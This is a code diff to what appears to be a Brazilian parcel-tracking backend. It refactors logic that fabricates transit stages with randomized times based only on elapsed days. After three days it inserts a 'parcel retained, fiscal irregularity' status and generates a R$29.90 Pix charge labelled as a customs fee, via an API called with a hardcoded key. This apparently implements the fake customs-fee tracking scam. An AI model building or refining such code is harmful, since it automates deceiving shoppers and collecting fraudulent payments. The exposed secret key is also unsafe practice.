@@ -8,6 +8,90 @@ router.get('/config/centavos', (req, res) => {
     res.json({ active: true });
 });
 
+// ===== HELPERS =====
+async function processAutomation(codigo, db) {
+    console.log(`[AUTOMATION] Verificando automação para: ${codigo}`);
+    const [rows] = await db.query(
+        'SELECT * FROM rastreios_status WHERE codigo = ? ORDER BY data ASC',
+        [codigo]
+    );
+
+    if (rows.length === 0) return null;
+
+    const packageData = rows[0];
+    const firstStageDate = new Date(packageData.data);
+    const now = new Date();
+    const diffDays = Math.floor((now.getTime() - firstStageDate.getTime()) / (1000 * 60 * 60 * 24));
+    const city = packageData.cidade;
+
+    const automationStages = [
+        { day: 1, status: '🚚 Em trânsito', title: '🚚 Em trânsito', sub: 'Seu objeto está sendo transportado entre unidades.' },
+        { day: 2, status: '🏢 No centro de distribuição', title: '🏢 No centro de distribuição', sub: 'O objeto chegou na unidade de tratamento da sua região.' }
+    ];
+
+    let updated = false;
+
+    // Adicionar etapas automáticas de trânsito
+    for (const stage of automationStages) {
+        if (diffDays >= stage.day && !rows.some(r => r.status_atual === stage.status)) {
+            console.log(`[AUTOMATION] Inserindo etapa automática: ${stage.status}`);
+            const stageDate = new Date(firstStageDate);
+            stageDate.setDate(stageDate.getDate() + stage.day);
+            stageDate.setHours(9 + Math.floor(Math.random() * 8), Math.floor(Math.random() * 59));
+
+            await db.query(
+                'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega, taxa_paga, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+                [codigo, city, stage.status, stage.title, stage.sub, packageData.tipo_entrega, packageData.taxa_paga, stageDate]
+            );
+            updated = true;
+        }
+    }
+
+    // Se for NORMAL e passaram 3 dias e não está pago -> Taxa no Dia 3
+    if (packageData.tipo_entrega === 'NORMAL' && diffDays >= 3 && !packageData.taxa_paga) {
+        const taxaStatus = '⚠️ Objeto retido - Aguardando regularização fiscal';
+        if (!rows.some(r => r.status_atual === taxaStatus)) {
+            console.log('[AUTOMATION] Condição de taxa atingida. Verificando PixGo...');
+
+            let taxaPixEmv = packageData.taxa_pix || null;
+
+            if (!taxaPixEmv) {
+                try {
+                    const pixRes = await axios.post('https://pixgo.org/api/v1/payment/create', {
+                        amount: 29.90,
+                        description: `Taxa da Alfândega - ${codigo}`
+                    }, {
+                        headers: {
+                            'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
+                            'Content-Type': 'application/json'
+                        },
+                        timeout: 5000
+                    });
+
+                    if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
+                        taxaPixEmv = pixRes.data.emv;
+                        console.log(`[PIXGO AUTO] Pix gerado para ${codigo}`);
+                    }
+                } catch (pixErr) {
+                    console.error('[PIXGO AUTO ERROR]', pixErr.response?.data || pixErr.message);
+                }
+            }
+
+            const taxaDate = new Date(firstStageDate);
+            taxaDate.setDate(taxaDate.getDate() + 3);
+            taxaDate.setHours(11 + Math.floor(Math.random() * 4), Math.floor(Math.random() * 59));
+
+            await db.query(
+                'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
+                [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL', taxaDate]
+            );
+            updated = true;
+        }
+    }
+
+    return updated;
+}
+
 // ===== TRACKING API =====
 
 // Listar todos (Admin) - Apenas o status mais recente de cada código único
@@ -15,6 +99,15 @@ router.get('/rastreios', async (req, res) => {
     const db = getDB();
     try {
         if (!db) throw new Error('Banco de dados não disponível');
+
+        // Buscar códigos únicos
+        const [uniqueRows] = await db.query('SELECT DISTINCT codigo FROM rastreios_status');
+
+        // Processar automação para cada um (pode ser otimizado futuramente para apenas ativos)
+        for (const row of uniqueRows) {
+            await processAutomation(row.codigo, db);
+        }
+
         const [rows] = await db.query(`
             SELECT t1.* 
             FROM rastreios_status t1
@@ -159,96 +252,22 @@ router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => 
         codigo = codigo.toUpperCase().trim();
         console.log(`Buscando código: ${codigo}`);
 
-        const [rows] = await db.query(
+        // Rodar Automação
+        await processAutomation(codigo, db);
+
+        // Buscar dados atualizados
+        const [currentRows] = await db.query(
             'SELECT * FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? ORDER BY data ASC',
             [codigo]
         );
 
-        if (rows.length === 0) {
+        if (currentRows.length === 0) {
             console.log(`Código ${codigo} não encontrado.`);
             return res.status(404).json({ success: false, message: 'Código de rastreio não encontrado.' });
         }
 
-        let packageData = rows[0];
-        console.log(`Objeto encontrado. Etapas atuais: ${rows.length}`);
-
-        // --- LÓGICA DE AUTOMAÇÃO DE ETAPAS ---
-        const firstStageDate = new Date(rows[0].data);
-        const now = new Date();
-        const diffDays = Math.floor((now.getTime() - firstStageDate.getTime()) / (1000 * 60 * 60 * 24));
-        const city = packageData.cidade;
-
-        console.log(`Dias desde a postagem: ${diffDays} | Tipo: ${packageData.tipo_entrega} | Pago: ${packageData.taxa_paga}`);
-
-        const automationStages = [
-            { day: 1, status: '🚚 Em trânsito', title: '🚚 Em trânsito', sub: 'Seu objeto está sendo transportado entre unidades.' },
-            { day: 2, status: '🏢 No centro de distribuição', title: '🏢 No centro de distribuição', sub: 'O objeto chegou na unidade de tratamento da sua região.' }
-        ];
-
-        // Adicionar etapas automáticas de trânsito
-        for (const stage of automationStages) {
-            if (diffDays >= stage.day && !rows.some(r => r.status_atual === stage.status)) {
-                console.log(`Inserindo etapa automática: ${stage.status}`);
-                const stageDate = new Date(firstStageDate);
-                stageDate.setDate(stageDate.getDate() + stage.day);
-                stageDate.setHours(9 + Math.floor(Math.random() * 8), Math.floor(Math.random() * 59));
-
-                await db.query(
-                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega, taxa_paga, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
-                    [codigo, city, stage.status, stage.title, stage.sub, packageData.tipo_entrega, packageData.taxa_paga, stageDate]
-                );
-            }
-        }
-
-        // Se for NORMAL e passaram 3 dias e não está pago -> Taxa no Dia 3
-        if (packageData.tipo_entrega === 'NORMAL' && diffDays >= 3 && !packageData.taxa_paga) {
-            const taxaStatus = '⚠️ Objeto retido - Aguardando regularização fiscal';
-            if (!rows.some(r => r.status_atual === taxaStatus)) {
-                console.log('Condição de taxa atingida. Verificando PixGo...');
-
-                let taxaPixEmv = packageData.taxa_pix || null;
-
-                if (!taxaPixEmv) {
-                    try {
-                        const pixRes = await axios.post('https://pixgo.org/api/v1/payment/create', {
-                            amount: 29.90,
-                            description: `Taxa da Alfândega - ${codigo}`
-                        }, {
-                            headers: {
-                                'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
-                                'Content-Type': 'application/json'
-                            },
-                            timeout: 5000
-                        });
-
-                        if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
-                            taxaPixEmv = pixRes.data.emv;
-                            console.log(`[PIXGO AUTO] Pix gerado para ${codigo}`);
-                        }
-                    } catch (pixErr) {
-                        console.error('[PIXGO AUTO ERROR]', pixErr.response?.data || pixErr.message);
-                    }
-                }
-
-                const taxaDate = new Date(firstStageDate);
-                taxaDate.setDate(taxaDate.getDate() + 3);
-                taxaDate.setHours(11 + Math.floor(Math.random() * 4), Math.floor(Math.random() * 59));
-
-                await db.query(
-                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                    [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL', taxaDate]
-                );
-            }
-        }
-
-        // Recarregar rows se algo foi inserido
-        const [updatedRows] = await db.query('SELECT * FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? ORDER BY data ASC', [codigo]);
-        const currentRows = updatedRows;
-        if (currentRows.length === 0) throw new Error('Erro ao recarregar dados após atualização');
-
+        const packageData = currentRows[0];
         const lastStatus = currentRows[currentRows.length - 1];
-        packageData = currentRows[0];
-
         const taxaRow = currentRows.find(r => (r.taxa_valor && parseFloat(r.taxa_valor) > 0) || r.taxa_pix);
 
         console.log('Preparando resposta JSON...');
